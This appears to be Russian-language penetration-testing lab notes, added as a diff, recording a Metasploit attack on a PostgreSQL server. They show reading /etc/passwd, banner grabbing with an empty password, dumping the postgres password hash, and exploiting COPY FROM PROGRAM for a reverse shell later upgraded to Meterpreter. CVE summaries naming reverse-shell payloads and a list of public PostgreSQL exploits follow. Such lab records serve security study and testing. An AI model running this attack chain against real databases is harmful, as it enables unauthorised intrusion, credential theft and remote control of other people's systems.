@@ -1,0 +1,95 @@
+а) чтение информации из файла passwd для получения информации о всех зарегестрированных пользователях 
+msf6 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 192.168.0.13
+RHOSTS => 192.168.0.13
+msf6 auxiliary(admin/postgres/postgres_readfile) > set rfile /etc/passwd
+rfile => /etc/passwd
+msf6 auxiliary(admin/postgres/postgres_readfile) > run
+[*] Running module against 192.168.0.13
+Query Text: 'CREATE TEMP TABLE RGdAeAmJuPCLMc (INPUT TEXT);
+      COPY RGdAeAmJuPCLMc FROM '/etc/passwd';
+      SELECT * FROM RGdAeAmJuPCLMc'
+
+б) захват баннеров 
+msf6 auxiliary(admin/postgres/postgres_sql) > set rhosts 192.168.0.13
+rhosts => 192.168.0.13
+msf6 auxiliary(admin/postgres/postgres_sql) > set password ""
+password => 
+msf6 auxiliary(admin/postgres/postgres_sql) > run
+[*] Running module against 192.168.0.13
+Query Text: 'select version()'
+==============================
+    version
+    -------
+    PostgreSQL 9.6.15 on x86_64-pc-linux-musl, compiled by gcc (Alpine 8.3.0) 8.3.0, 64-bit
+[*] Auxiliary module execution completed
+
+в) получение hash пароля, для последующей его расшифровки:
+sf6 auxiliary(scanner/postgres/postgres_hashdump) > set rhosts 192.168.0.13
+rhosts => 192.168.0.13
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > run
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+ Username  Hash
+postgres  md5e8a48653851e28c69d0506508fb27fc5
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+г) получение сессионного доступа и выполнение произвольного кода в системе:
+Эксплуатация уязвимости:
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhosts 192.168.0.13
+rhosts => 192.168.0.13
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password ""
+password => 
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost 192.168.0.20
+lhost => 192.168.0.20
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
+
+[*] Started reverse TCP handler on 192.168.0.20:4444 
+[*] 192.168.0.13:5432 - 192.168.0.13:5432 - PostgreSQL 9.6.15 on x86_64-pc-linux-musl, compiled by gcc (Alpine 8.3.0) 8.3.0, 64-bit
+[*] 192.168.0.13:5432 - Exploiting...
+[+] 192.168.0.13:5432 - 192.168.0.13:5432 - 3LvolMSL8hZS dropped successfully
+[+] 192.168.0.13:5432 - 192.168.0.13:5432 - 3LvolMSL8hZS created successfully
+[+] 192.168.0.13:5432 - 192.168.0.13:5432 - 3LvolMSL8hZS copied successfully(valid syntax/command)
+[+] 192.168.0.13:5432 - 192.168.0.13:5432 - 3LvolMSL8hZS dropped successfully(Cleaned)
+[*] 192.168.0.13:5432 - Exploit Succeeded
+[*] Command shell session 1 opened (192.168.0.20:4444 -> 192.168.0.13:45826) at 2023-07-27 04:16:01 -0400
+Создание сессий для удаленного управления:
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.0.20:4433 
+[*] Sending stage (1017704 bytes) to 192.168.0.13
+[*] Meterpreter session 2 opened (192.168.0.20:4433 -> 192.168.0.13:51716) at 2023-07-27 04:19:19 -0400
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > sessions 2
+[*] Starting interaction with 2...
+meterpreter >
+
+CVE-2017-7484
+CVE-2019-19015 By connecting to the database through the proxy (without password authentication), an attacker is able to fully control the appliance database. Through this, several different paths exist to gain further access, or execute code. 
+
+CVE-2019-19475 	An issue was discovered in ManageEngine Applications Manager 14 with Build 14360. Integrated PostgreSQL which is built-in in Applications Manager is prone to attack due to lack of file permission security. The malicious users who are in &#8220;Authenticated Users&#8221; group can exploit privilege escalation and modify PostgreSQL configuration to execute arbitrary command to escalate and gain full system privilege user access and rights over the system. 
+
+2019-9193 Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with 'pg_execute_server_program' to pipe to and from an external program using COPY.
+This allows arbitrary command execution as though you have console access. This module attempts to create a new table, then execute system commands in the context of copying the command output into the table.
+This module should work on all Postgres systems running version 9.3 and above.
+For Linux & OSX systems, target 1 is used with cmd payloads such as: cmd/unix/reverse_perl
+For Windows Systems, target 2 is used with powershell payloads such as: cmd/windows/powershell_reverse_tcp
+Alternativly target 3 can be used to execute generic commands, such as a web_delivery meterpreter powershell payload or other customised command.
+
+
+PostgreSQL - 'bitsubstr' Buffer Overflow                                                                              | linux/dos/33571.txt
+PostgreSQL 6.3.2/6.5.3 - Cleartext Passwords                                                                          | immunix/local/19875.txt
+PostgreSQL 7.x - Multiple Vulnerabilities                                                                             | linux/dos/25076.c
+PostgreSQL 8.01 - Remote Reboot (Denial of Service)                                                                   | multiple/dos/946.c
+PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                                                    | linux/local/7855.txt
+PostgreSQL 8.3.6 - Conversion Encoding Remote Denial of Service                                                       | linux/dos/32849.txt
+PostgreSQL 8.3.6 - Low Cost Function Information Disclosure                                                           | multiple/local/32847.txt
+PostgreSQL 8.4.1 - JOIN Hashtable Size Integer Overflow Denial of Service                                             | multiple/dos/33729.txt
+PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                                                     | multiple/remote/46813.rb
+PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                     | multiple/remote/50847.py
+PostgreSQL 9.4-0.5.3 - Privilege Escalation                                                                           | linux/local/45184.sh
+PostgreSQL 9.6.1 - Remote Code Execution (RCE) (Authenticated)                                                        | multiple/remote/51247.py
+
